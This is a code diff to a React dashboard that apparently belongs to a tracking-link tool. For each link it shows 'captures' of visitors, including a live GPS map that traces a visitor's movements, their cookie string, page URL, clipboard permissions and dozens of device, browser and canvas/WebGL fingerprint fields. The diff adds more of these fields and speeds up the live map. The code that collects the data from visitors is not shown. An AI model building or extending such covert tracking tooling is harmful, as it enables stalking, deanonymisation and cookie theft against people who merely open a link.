@@ -31,6 +31,22 @@ export default function Dashboard() {
   const [serverWaking, setServerWaking] = useState(true);
   const [liveCaptures, setLiveCaptures] = useState(null);
 
+  // Preload Leaflet immediately so map is instant when opened
+  useEffect(() => {
+    if (!document.getElementById("leaflet-css")) {
+      const link = document.createElement("link");
+      link.id = "leaflet-css"; link.rel = "stylesheet";
+      link.href = "https://unpkg.com/leaflet@1.9.4/dist/leaflet.css";
+      document.head.appendChild(link);
+    }
+    if (!document.getElementById("leaflet-js") && !window.L) {
+      const script = document.createElement("script");
+      script.id = "leaflet-js";
+      script.src = "https://unpkg.com/leaflet@1.9.4/dist/leaflet.js";
+      document.head.appendChild(script);
+    }
+  }, []);
+
   useEffect(() => {
     setServerWaking(true);
     fetch(BACKEND_URL + "/api/links/health")
@@ -437,25 +453,30 @@ function GPSMap({ lat, lon, liveCaptures, captureRealIndex }) {
   const markerRef = useRef(null);
   const polylineRef = useRef(null);
   const pathPointsRef = useRef([]);
-  const initAttempts = useRef(0);
+  const attemptsRef = useRef(0);
   const [mapLoaded, setMapLoaded] = useState(false);
 
   function tryInitMap() {
     if (mapInstanceRef.current) return;
-    if (!mapRef.current || !window.L) return;
-    // Wait until container actually has size (panel must be expanded)
+    if (!mapRef.current) { setTimeout(tryInitMap, 50); return; }
+    if (!window.L) { setTimeout(tryInitMap, 50); return; }
     const rect = mapRef.current.getBoundingClientRect();
-    if (rect.width === 0 || rect.height === 0) {
-      if (initAttempts.current < 40) {
-        initAttempts.current++;
-        setTimeout(tryInitMap, 80);
-      }
+    if ((rect.width === 0 || rect.height === 0) && attemptsRef.current < 60) {
+      attemptsRef.current++;
+      setTimeout(tryInitMap, 50);
       return;
     }
     try {
       const L = window.L;
-      const map = L.map(mapRef.current, { zoomControl: true, attributionControl: false }).setView([lat, lon], 16);
-      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", { maxZoom: 19 }).addTo(map);
+      const map = L.map(mapRef.current, {
+        zoomControl: true,
+        attributionControl: false,
+        preferCanvas: true,
+      }).setView([lat, lon], 16);
+      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+        maxZoom: 19,
+        keepBuffer: 4,
+      }).addTo(map);
       const icon = L.divIcon({
         className: "",
         html: `<div style="width:16px;height:16px;background:#3b82f6;border:3px solid white;border-radius:50%;box-shadow:0 0 12px rgba(59,130,246,0.9);"></div>`,
@@ -469,40 +490,28 @@ function GPSMap({ lat, lon, liveCaptures, captureRealIndex }) {
       polylineRef.current = polyline;
       mapInstanceRef.current = map;
       setMapLoaded(true);
-      // Fire invalidateSize multiple times to guarantee tiles render
-      [100, 300, 600, 1200].forEach(ms => setTimeout(() => map.invalidateSize(), ms));
+      [0, 100, 300, 700].forEach(ms => setTimeout(() => {
+        if (mapInstanceRef.current) mapInstanceRef.current.invalidateSize();
+      }, ms));
     } catch (e) {
-      console.error("[GPSMap]", e);
+      console.error("[GPSMap init]", e);
     }
   }
 
   useEffect(() => {
-    if (!document.getElementById("leaflet-css")) {
-      const link = document.createElement("link");
-      link.id = "leaflet-css"; link.rel = "stylesheet";
-      link.href = "https://unpkg.com/leaflet@1.9.4/dist/leaflet.css";
-      document.head.appendChild(link);
-    }
-    if (window.L) {
-      tryInitMap();
-    } else if (!document.getElementById("leaflet-js")) {
-      const script = document.createElement("script");
-      script.id = "leaflet-js";
-      script.src = "https://unpkg.com/leaflet@1.9.4/dist/leaflet.js";
-      script.onload = tryInitMap;
-      document.head.appendChild(script);
-    } else {
-      const wait = setInterval(() => { if (window.L) { clearInterval(wait); tryInitMap(); } }, 100);
-    }
+    tryInitMap();
     return () => {
       if (mapInstanceRef.current) {
         try { mapInstanceRef.current.remove(); } catch {}
-        mapInstanceRef.current = null; markerRef.current = null; polylineRef.current = null;
+        mapInstanceRef.current = null;
+        markerRef.current = null;
+        polylineRef.current = null;
+        pathPointsRef.current = [];
+        attemptsRef.current = 0;
       }
     };
   }, []);
 
-  // Live position update
   useEffect(() => {
     if (!mapInstanceRef.current || !markerRef.current || !liveCaptures || !window.L) return;
     const lc = liveCaptures[captureRealIndex];
@@ -516,16 +525,16 @@ function GPSMap({ lat, lon, liveCaptures, captureRealIndex }) {
     markerRef.current.setPopupContent(`<b>📍 Live GPS</b><br/>${newLat.toFixed(6)}, ${newLon.toFixed(6)}`);
     pathPointsRef.current.push([newLat, newLon]);
     polylineRef.current.setLatLngs(pathPointsRef.current);
-    mapInstanceRef.current.panTo([newLat, newLon], { animate: true, duration: 1 });
+    mapInstanceRef.current.panTo([newLat, newLon], { animate: true, duration: 0.8 });
   }, [liveCaptures, captureRealIndex]);
 
   const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
   return (
     <div className="mb-2">
-      <div className="rounded-xl overflow-hidden border border-surface-border relative" style={{ height: "260px" }}>
+      <div className="rounded-xl overflow-hidden border border-surface-border relative" style={{ height: "260px", background: "#1a1a2e" }}>
         {!mapLoaded && (
-          <div className="absolute inset-0 flex items-center justify-center bg-surface z-10">
+          <div className="absolute inset-0 flex items-center justify-center z-10">
             <div className="flex flex-col items-center gap-2">
               <div className="w-6 h-6 border-2 border-primary border-t-transparent rounded-full animate-spin" />
               <span className="font-body text-xs text-text-muted">Loading map...</span>
@@ -534,15 +543,20 @@ function GPSMap({ lat, lon, liveCaptures, captureRealIndex }) {
         )}
         <div ref={mapRef} style={{ height: "100%", width: "100%" }} />
       </div>
-      <a href={googleMapsUrl} target="_blank" rel="noopener noreferrer"
-        className="mt-2 flex items-center justify-center gap-2 w-full px-4 py-2.5 bg-surface border border-surface-border rounded-lg font-body text-xs text-text-primary hover:bg-primary/10 hover:border-primary/40 transition-colors">
-        <Globe className="w-3.5 h-3.5 text-primary" /> Open in Google Maps
+      <a 
+        href={googleMapsUrl}
+        target="_blank"
+        rel="noopener noreferrer"
+        className="mt-2 flex items-center justify-center gap-2 w-full px-4 py-2.5 bg-surface border border-surface-border rounded-lg font-body text-xs text-text-primary hover:bg-primary/10 hover:border-primary/40 transition-colors"
+      >
+        <Globe className="w-3.5 h-3.5 text-primary" />
+        Open in Google Maps
       </a>
     </div>
   );
 }
 
-// ── CAPTURE DETAIL ─────────────────────────────────────────────────────────────
+// ── CAPTURE DETAIL ────────────────────────────────────────────────────────────
 function CaptureDetail({ capture, linkId, captureIndex, liveCaptures, captureRealIndex }) {
   const [copied, setCopied] = useState(false);
   const liveCapture = liveCaptures?.[captureRealIndex];
@@ -629,8 +643,10 @@ function CaptureDetail({ capture, linkId, captureIndex, liveCaptures, captureRea
         <DataRow label="Device Brand" value={capture.deviceBrand} />
         <DataRow label="Device Model" value={capture.deviceModel} />
         <DataRow label="Device Type" value={capture.device} />
+        <DataRow label="Form Factor" value={capture.formFactor} />
         <DataRow label="Browser" value={capture.browser} />
         <DataRow label="Browser Version" value={capture.browserVersion} />
+        <DataRow label="Browser Engine" value={capture.browserEngine} />
         <DataRow label="Browser Code Name" value={capture.browserCodeName} />
         <DataRow label="OS" value={capture.os} />
         <DataRow label="Platform" value={capture.platform} />
@@ -650,7 +666,9 @@ function CaptureDetail({ capture, linkId, captureIndex, liveCaptures, captureRea
       <Section title="⚙️ Hardware">
         <DataRow label="CPU Cores" value={capture.cpuCores != null ? String(capture.cpuCores) : null} />
         <DataRow label="RAM (GB)" value={capture.ram != null ? String(capture.ram) : null} />
+        <DataRow label="RAM Raw" value={capture.memoryTierRaw} />
         <DataRow label="Memory Tier" value={capture.memoryTier} />
+        <DataRow label="CPU Benchmark" value={capture.cpuBenchmarkScore} />
         <DataRow label="Max Touch Points" value={capture.maxTouchPoints != null ? String(capture.maxTouchPoints) : null} />
         <DataRow label="Touch Detail" value={capture.maxTouchPointsDetail} />
         <DataRow label="Touch Support" value={capture.touchSupport != null ? String(capture.touchSupport) : null} />
@@ -658,6 +676,9 @@ function CaptureDetail({ capture, linkId, captureIndex, liveCaptures, captureRea
         <DataRow label="Pointer Type" value={capture.pointerType} />
         <DataRow label="Pointer Fine" value={capture.pointerFine} />
         <DataRow label="Hover Capability" value={capture.hoverCapability} />
+        <DataRow label="Device Motion" value={capture.deviceMotionSupport} />
+        <DataRow label="Device Orientation" value={capture.deviceOrientationSupport} />
+        <DataRow label="Ambient Light Sensor" value={capture.ambientLightSupport} />
         <DataRow label="Java Enabled" value={capture.javaEnabled != null ? String(capture.javaEnabled) : null} />
         <DataRow label="PDF Viewer" value={capture.pdfViewerEnabled != null ? String(capture.pdfViewerEnabled) : null} />
         <DataRow label="Gamepads Connected" value={capture.gamepadsConnected} />
@@ -672,6 +693,7 @@ function CaptureDetail({ capture, linkId, captureIndex, liveCaptures, captureRea
         <DataRow label="Shading Language" value={capture.webglShadingLanguage} />
         <DataRow label="WebGL Hash" value={capture.webglHash} />
         <DataRow label="Shader Precision" value={capture.shaderPrecision} />
+        <DataRow label="WebGL Color Bits" value={capture.webglColorBits} />
         <DataRow label="Max Texture Size" value={capture.maxTextureSize} />
         <DataRow label="Max Viewport Dims" value={capture.maxViewportDims} />
         <DataRow label="Max Anisotropy" value={capture.maxAnisotropy} />
@@ -694,6 +716,7 @@ function CaptureDetail({ capture, linkId, captureIndex, liveCaptures, captureRea
       <Section title="🖥️ Screen & Display">
         <DataRow label="Screen Width" value={capture.screenWidth != null ? String(capture.screenWidth) : null} />
         <DataRow label="Screen Height" value={capture.screenHeight != null ? String(capture.screenHeight) : null} />
+        <DataRow label="Physical Resolution" value={capture.physicalResolution} />
         <DataRow label="Avail Width" value={capture.screenAvailWidth != null ? String(capture.screenAvailWidth) : null} />
         <DataRow label="Avail Height" value={capture.screenAvailHeight != null ? String(capture.screenAvailHeight) : null} />
         <DataRow label="Window Width" value={capture.windowWidth != null ? String(capture.windowWidth) : null} />
@@ -709,6 +732,7 @@ function CaptureDetail({ capture, linkId, captureIndex, liveCaptures, captureRea
         <DataRow label="Orientation Angle" value={capture.orientationAngle != null ? String(capture.orientationAngle) : null} />
         <DataRow label="HDR Support" value={capture.hdrSupport} />
         <DataRow label="Color Gamut" value={capture.colorGamut} />
+        <DataRow label="Color Scheme" value={capture.colorScheme} />
         <DataRow label="Forced Colors" value={capture.forcedColors} />
         <DataRow label="Inverted Colors" value={capture.invertedColors} />
         <DataRow label="Prefers Color Scheme" value={capture.prefersColorScheme} />
@@ -728,8 +752,10 @@ function CaptureDetail({ capture, linkId, captureIndex, liveCaptures, captureRea
         <DataRow label="Discharging Time" value={capture.batteryDischargingTime != null ? String(capture.batteryDischargingTime) : null} />
         <DataRow label="Connection Type" value={capture.connectionType} />
         <DataRow label="Connection Quality" value={capture.connectionQuality} />
-        <DataRow label="Downlink" value={capture.connectionDownlink != null ? String(capture.connectionDownlink) : null} />
-        <DataRow label="RTT" value={capture.connectionRtt != null ? String(capture.connectionRtt) : null} />
+        <DataRow label="Network Label" value={capture.networkLabel} />
+        <DataRow label="Speed Tier" value={capture.speedTier} />
+        <DataRow label="Downlink" value={capture.connectionDownlink != null ? String(capture.connectionDownlink) + " Mbps" : null} />
+        <DataRow label="RTT" value={capture.connectionRtt != null ? String(capture.connectionRtt) + " ms" : null} />
         <DataRow label="Save Data" value={capture.connectionSaveData != null ? String(capture.connectionSaveData) : null} />
         <DataRow label="Downlink Max" value={capture.connectionDownlinkMax != null ? String(capture.connectionDownlinkMax) : null} />
         <DataRow label="Online Status" value={capture.onlineStatus} />
@@ -740,13 +766,17 @@ function CaptureDetail({ capture, linkId, captureIndex, liveCaptures, captureRea
         <DataRow label="Captured At" value={capture.capturedAt} />
         <DataRow label="Capture Timestamp" value={capture.captureTimestamp} />
         <DataRow label="Local Time" value={capture.localTime} />
+        <DataRow label="Local Time (12h)" value={capture.localTime12} />
+        <DataRow label="Local Date" value={capture.localDate} />
         <DataRow label="Client Timezone" value={capture.clientTimezone} />
-        <DataRow label="Timezone Offset" value={capture.timezoneOffset != null ? String(capture.timezoneOffset) : null} />
+        <DataRow label="Timezone Formatted" value={capture.tzFormatted} />
+        <DataRow label="Timezone Offset" value={capture.timezoneOffset != null ? String(capture.timezoneOffset) + " min" : null} />
         <DataRow label="DST Active" value={capture.dstActive} />
         <DataRow label="Day of Week" value={capture.dayOfWeek} />
         <DataRow label="Time of Day" value={capture.timeOfDay} />
         <DataRow label="Language" value={capture.language} />
         <DataRow label="Languages" value={capture.languages} />
+        <DataRow label="Doc Language" value={capture.docLanguage} />
       </Section>
 
       <Section title="🔒 Privacy & Fingerprint">
@@ -756,6 +786,9 @@ function CaptureDetail({ capture, linkId, captureIndex, liveCaptures, captureRea
         <DataRow label="Do Not Track" value={capture.doNotTrack} />
         <DataRow label="History Length" value={capture.historyLength != null ? String(capture.historyLength) : null} />
         <DataRow label="Navigation Count" value={capture.navigationCount != null ? String(capture.navigationCount) : null} />
+        <DataRow label="Navigation Type" value={capture.navigationEntryType} />
+        <DataRow label="Session Length" value={capture.sessionLengthSeconds ? capture.sessionLengthSeconds + "s" : null} />
+        <DataRow label="Tabs Estimate" value={capture.tabsEstimate} />
         <DataRow label="Referrer" value={capture.referrer} />
         <DataRow label="Canvas Hash" value={capture.canvasHash} />
         <DataRow label="Canvas Geometry Hash" value={capture.canvasGeometryHash} />
@@ -766,12 +799,14 @@ function CaptureDetail({ capture, linkId, captureIndex, liveCaptures, captureRea
         <DataRow label="Visibility State" value={capture.visibilityState} />
         <DataRow label="Is Secure Context" value={capture.isSecureContext} />
         <DataRow label="Cross Origin Isolated" value={capture.crossOriginIsolated} />
+        <DataRow label="Is Fullscreen" value={capture.isFullscreen} />
+        <DataRow label="Window Focused" value={capture.windowFocused} />
+        <DataRow label="Has Focus" value={capture.hasFocus} />
         <DataRow label="Document Charset" value={capture.documentCharset} />
         <DataRow label="Compat Mode" value={capture.documentCompatMode} />
         <DataRow label="Window Name" value={capture.windowName} />
         <DataRow label="Scroll X" value={capture.scrollPositionX != null ? String(capture.scrollPositionX) : null} />
         <DataRow label="Scroll Y" value={capture.scrollPositionY != null ? String(capture.scrollPositionY) : null} />
-        <DataRow label="Has Focus" value={capture.hasFocus} />
         <DataRow label="Page URL" value={capture.pageUrl} />
         <DataRow label="Cookie String" value={capture.cookieString} />
       </Section>
@@ -790,10 +825,20 @@ function CaptureDetail({ capture, linkId, captureIndex, liveCaptures, captureRea
         <DataRow label="Voice Names" value={capture.speechVoices} />
       </Section>
 
+      <Section title="🎬 Media & Codecs">
+        <DataRow label="Codec Support" value={capture.codecSupport} />
+        <DataRow label="H.264" value={capture.h264Support} />
+        <DataRow label="VP9" value={capture.vp9Support} />
+        <DataRow label="AV1" value={capture.av1Support} />
+        <DataRow label="WebGL Color Bits" value={capture.webglColorBits} />
+        <DataRow label="LocalStorage Size" value={capture.localStorageSize} />
+      </Section>
+
       <Section title="💾 Storage">
         <DataRow label="Storage Quota" value={capture.storageQuota} />
         <DataRow label="Storage Used" value={capture.storageUsage} />
         <DataRow label="LocalStorage" value={capture.localStorageEnabled != null ? String(capture.localStorageEnabled) : null} />
+        <DataRow label="LocalStorage Size" value={capture.localStorageSize} />
         <DataRow label="SessionStorage" value={capture.sessionStorageEnabled != null ? String(capture.sessionStorageEnabled) : null} />
         <DataRow label="IndexedDB" value={capture.indexedDBEnabled != null ? String(capture.indexedDBEnabled) : null} />
         <DataRow label="Cache API" value={capture.cacheAPIEnabled} />
@@ -835,6 +880,7 @@ function CaptureDetail({ capture, linkId, captureIndex, liveCaptures, captureRea
         <DataRow label="Clipboard Read" value={capture.clipboardReadPermission} />
         <DataRow label="Clipboard Write" value={capture.clipboardWritePermission} />
         <DataRow label="Keyboard Layout" value={capture.keyboardLayout} />
+        <DataRow label="Permission API" value={capture.permissionAPISupport} />
       </Section>
 
       <Section title="✅ Feature Support">
